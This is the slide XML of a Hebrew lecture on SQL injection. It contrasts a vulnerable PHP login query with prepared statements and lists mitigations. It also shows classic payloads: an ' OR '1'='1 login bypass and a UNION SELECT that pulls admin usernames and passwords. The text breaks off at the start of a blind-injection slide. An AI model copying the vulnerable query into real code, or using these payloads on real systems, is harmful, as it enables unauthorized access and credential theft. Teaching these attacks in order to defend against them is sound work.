          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>ORM (Object-Relational Mapping)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בכלי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ORM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמבצעים את השאילתות בצורה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאובטחת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הצפנה של קלט רגיש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הצפנה ושמירה של מידע רגיש כמו סיסמאות באופן מאובטח.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="293174067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4EE3F58-BB23-445E-8189-3F98FFC11615}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4075042" y="642594"/>
            <a:ext cx="7050157" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה בסיסית להזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2530E69-40E9-45FB-80A9-E084FA8FED66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו קוד ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמבצע אימות משתמש בצורה הבאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$username = $_POST['username'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$password = $_POST['password'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$result = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mysqli_query</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>($conn, $query);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="353236365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C7D3A4-341A-43E3-9C84-B85BE42C6E2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2037522" y="731520"/>
            <a:ext cx="9465365" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - דוגמה בסיסית להזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F81CA0B-4FBF-471D-8952-5783BC4B9F80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בגדול: הקוד מקבל שם משתמש וסיסמה מטופס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>,HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יוצר שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לחפש משתמש עם שם המשתמש והסיסמה הללו בטבלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומבצע את השאילתה במסד הנתונים, כלומר כאשר המשתמש מזין שם משתמש וסיסמה, הקוד בונה שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ומריץ אותה בבסיס הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שמשתמש מזין את הפרטים הבאים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: admin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: OR ‘1’ = ‘1’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד ייצר את השאילתה הבאה:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1’;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השאילתה תבחר את כל המשתמשים שבהם התנאי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 1=1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא תמיד נכון, וכך התוקף יקבל גישה למערכת ללא צורך בסיסמה.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="63157217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812E125-5385-47EA-BBC4-2B8B2BA42DCC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1391478" y="642594"/>
            <a:ext cx="9733722" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה לשימוש בשאילתות פרמטריות ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5953BCDC-BC5A-45BD-8024-18028252E7DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאן, השאילתה משתמשת בפרמטרים שמונעים מהתוקף להזריק קוד זדוני. פרמטרים אלה מוודאים שהקלט מתייחס כקלט בלבד, ולא כחלק מהקוד.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stmt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = $conn-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>prepare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("SELECT * FROM users WHERE username = ? AND password = ?");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stmt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>bind_param</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("ss", $username, $password);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stmt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>execute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$result = $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stmt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>get_result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="77939448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3CDCC1A-B5CE-49CF-85FC-697624527798}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="397565" y="612777"/>
            <a:ext cx="12006469" cy="1285597"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - דוגמה לשימוש בשאילתות פרמטריות ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{88CFEAB2-B232-421C-8525-A8E11AF1A449}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה מכין שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמחפשת משתמש בטבלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על פי שם משתמש וסיסמה, תוך שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Prepared Statements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי למנוע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסבר:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>prepare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יוצרת את השאילתה עם מקומות שמורים ? לערכים שיכנסו מאוחר יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bind_param</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קושרת את הערכים של המשתנים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ו- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> למקומות השמורים בשאילתה בצורה מאובטחת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לבסוף, השאילתה מתבצעת באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>execute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prepared Statements </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מונע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על ידי הקפדה שהערכים ייכנסו לשאילתה בצורה בטוחה ומבוקרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="370104377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2A66C0B-DEC6-4BC7-BA81-9FEE7FD27D14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3230216" y="642594"/>
            <a:ext cx="7894983" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Union-Based SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{828933E7-DBF0-4233-BCDC-8D1550D29FC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Union-Based SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא שיטה שבה התוקף משתמש בפקודת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>UNION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לשלב תוצאות משתי שאילתות שונות לפלט אחד. זה מאפשר לתוקף להוסיף נתונים משולחן אחר לשאילתה המקורית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו שאילתה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SELECT name, email FROM users WHERE id = 1;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף יכול להזריק את הטקסט הבא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1 UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>admin_users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השאילתה החדשה תיראה כך:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SELECT name, email FROM users WHERE id = 1 UNION SELECT username, password FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>admin_users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כעת, התוקף יקבל בפלט את כל שמות המשתמשים והסיסמאות מהטבלה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>admin_users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40818122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7235DA2-5177-48D0-9804-7145AD007849}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1878496" y="86002"/>
            <a:ext cx="9246704" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Boolean-Based Blind SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05EBA135-7840-4199-8E21-4ACDA27228D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1178779"/>
            <a:ext cx="10058400" cy="5947577"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Blind SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתרחשת כאשר האתר אינו מחזיר הודעות שגיאה ברורות, אך עדיין ניתן להבחין בתגובות שונות על פי תנאים שמכניסים לשאילתה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו שאילתה שבודקת אם שם המשתמש קיים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SELECT * FROM users WHERE username = '$username’;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף יכול לבדוק תנאים בצורה עיוורת כך:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
